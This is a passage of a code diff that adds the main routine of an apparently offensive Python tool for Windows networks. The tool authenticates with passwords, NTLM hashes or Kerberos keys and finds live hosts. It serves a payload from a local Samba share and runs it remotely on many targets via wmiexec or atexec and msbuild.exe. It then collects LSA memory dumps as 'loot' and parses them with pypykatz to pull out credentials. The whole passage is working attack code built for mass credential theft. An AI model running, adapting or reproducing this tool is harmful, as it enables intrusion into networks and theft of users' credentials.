+    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
+    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('-ap', action='store_true', default = False, help='Turn auto parsing of .dmp files ON')
+    parser.add_argument('-drive', action='store', default = 'Q', help='Set the drive letter for the remote device to connect with default=Q')
+    parser.add_argument('-threads', action='store', type = int, default = 5,help='Set the maximum number of threads default=5')
+    parser.add_argument('-method', action='store', default='wmiexec', choices=['wmiexec', 'atexec'], help='Choose a method to execute the commands')
+    parser.add_argument('-ip', action='store', help='Your local ip for the remote device to connect to')
+    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
+                                                       '"%s"). If errors are detected, run chcp.com at the target, '
+                                                       'map the result with '
+                                                       'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
+                                                       'again with -codec and the corresponding codec ' % CODEC)
+    parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION",
+                        help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
+
+    group = parser.add_argument_group('authentication')
+
+    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
+    group.add_argument('-k', action="store_true",
+                       help='Use Kerberos authentication. Grabs credentials from ccache file '
+                            '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
+                            'ones specified in the command line')
+    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
+                                                                          '(128 or 256 bits)')
+    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
+                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')
+    group.add_argument('-A', action="store", metavar="authfile", help="smbclient/mount.cifs-style authentication file. "
+                                                                      "See smbclient man page's -A option.")
+    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
+
+    if len(sys.argv) == 1:
+        parser.print_help()
+        sys.exit(1)
+
+    if os.geteuid() != 0:
+        print("[!] Must be run as sudo")
+        exit(1)
+
+    options = parser.parse_args()
+
+    # Init the example's logger theme
+    logger.init(options.ts)
+
+    if options.codec is not None:
+        CODEC = options.codec
+    else:
+        if CODEC is None:
+            CODEC = 'utf-8'
+
+    if options.debug is True:
+        logging.getLogger().setLevel(logging.DEBUG)
+        # Print the Library's installation path
+        logging.debug(version.getInstallationPath())
+    else:
+        logging.getLogger().setLevel(logging.INFO)
+
+    if options.com_version is not None:
+        try:
+            major_version, minor_version = options.com_version.split('.')
+            COMVERSION.set_default_version(int(major_version), int(minor_version))
+        except Exception:
+            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
+            sys.exit(1)
+
+    domain, username, password, address = parse_target(options.target)
+
+    try:
+        if options.A is not None:
+            (domain, username, password) = load_smbclient_auth_file(options.A)
+            logging.debug('loaded smbclient auth file: domain=%s, username=%s, password=%s' % (
+                repr(domain), repr(username), repr(password)))
+
+        if domain is None:
+            domain = ''
+
+        if options.keytab is not None:
+            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
+            options.k = True
+
+        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
+            from getpass import getpass
+
+            password = getpass("Password:")
+
+        if options.aesKey is not None:
+            options.k = True
+
+        if options.drive is not None and options.drive.isalpha() and len(options.drive) < 2: # did we get a drive letter?
+            drive_letter = str(options.drive).upper()
+        else:
+            drive_letter = 'Q'
+
+        if options.ip is not None: # did they give us the local ip in the command line
+            local_ip = options.ip
+        else:
+            # print local interfaces and ips
+            print("")
+            ifaces = ni.interfaces()
+            for face in ifaces:
+                print(str(face + ':').ljust(20), ni.ifaddresses(face)[ni.AF_INET][0]['addr'])
+
+            local_ip = input("\nEnter you local ip: ")
+
+            # lets you enter eth0 as the ip
+            if local_ip in ifaces:
+                local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
+                print("local IP => " + local_ip)
+
+        addresses = do_ip(address) # gets a list of up hosts
+        try:
+            addresses.remove(local_ip) # no point in attacking ourselves
+        except:
+            pass
+
+        if len(addresses) > 500: # ensure that they dont waste over 25 gb of storage
+            print("\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? ".format(str(len(addresses)), str((len(addresses)*52)/1024)))
+            choice = input("(N/y): ")
+            if choice.lower() == 'n':
+                exit(0)
+
+        share_name, share_user, share_pass, payload_name, share_group = setup_share() # creates and starts our share
+
+        gen_payload(share_name, payload_name, drive_letter) # creates the payload
+
+        print("\n[share-info]\nShare location: /var/tmp/{}\nUsername: {}\nPassword: {}\n".format(share_name, share_user, share_pass))
+
+        print("[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
+        command = r"net use {}: \\{}\{} /user:{} {} & C:\\Windows\\Microsoft.NET\\framework64\\v4.0.30319\\msbuild.exe {}:\{}.xml".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name)
+        print(command)
+        print("")
+
+        # multithreading yeah
+        with concurrent.futures.ThreadPoolExecutor(max_workers=options.threads) as thread_exe:
+            for ip in addresses:
+                print("{} Attacking {}".format(green_plus, ip))
+                try:
+                    out = thread_exe.submit(mt_execute, ip)
+                except Exception as e:
+                    if logging.getLogger().level == logging.DEBUG:
+                        import traceback
+
+                        traceback.print_exc()
+                    logging.error(str(e))
+                    continue
+
+                except KeyboardInterrupt as e:
+                    continue
+
+        time.sleep(2)
+        os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, os.getcwd(), timestamp))
+
+        if options.ap != False:
+            print("\n[parsing files]")
+            os.system("pypykatz lsa minidump -d ./loot/{}/ -o ./loot/{}/dumped_full.txt".format(timestamp, timestamp))
+            os.system("pypykatz lsa -g minidump -d ./loot/{}/ -o ./loot/{}/dumped_full_grep.grep".format(timestamp, timestamp))
+            os.system("echo 'Domain:Username:NT:LM' > ./loot/{}/dumped_msv.txt; grep 'msv' ./loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host' >> ./loot/{}/dumped_msv.txt".format(timestamp, timestamp, timestamp))
+
+
+    except KeyboardInterrupt as e:
+        logging.error(str(e))
+        print("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
+        try:
+            os.system("sudo systemctl stop smbd")
+        except BaseException as e:
+            pass
+
+        try:
+            os.system("sudo cp " + os.getcwd() + "/smb.conf /etc/samba/smb.conf")
+        except BaseException as e:
+            pass
+
+        try:
+            os.system("sudo rm " + os.getcwd() + "/smb.conf")
+        except BaseException as e:
+            pass
+
+        try:
+            os.system("sudo userdel " + share_user)
+        except BaseException as e:
+            pass
+
+        try:
+            os.system("sudo groupdel " + share_group)
+        except BaseException as e:
+            pass
+
+        try:
+            os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, os.getcwd(), timestamp))
+        except BaseException as e:
+            pass
+        print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
+        exit(0)
+
+
+    print("{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
+    try:
+        os.system("sudo systemctl stop smbd")
+    except BaseException as e:
+        pass
+
+    try:
+        os.system("sudo cp " + os.getcwd() + "/smb.conf /etc/samba/smb.conf")
+    except BaseException as e:
+        pass
+
+    try:
+        os.system("sudo rm " + os.getcwd() + "/smb.conf")
+    except BaseException as e:
+        pass
+
+    try:
+        os.system("sudo userdel " + share_user)
+    except BaseException as e:
+        pass
+
+    try:
+        os.system("sudo groupdel " + share_group)
+    except BaseException as e:
+        pass
+    print("{}[-]{} Cleanup completed! If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
+    sys.exit(0)
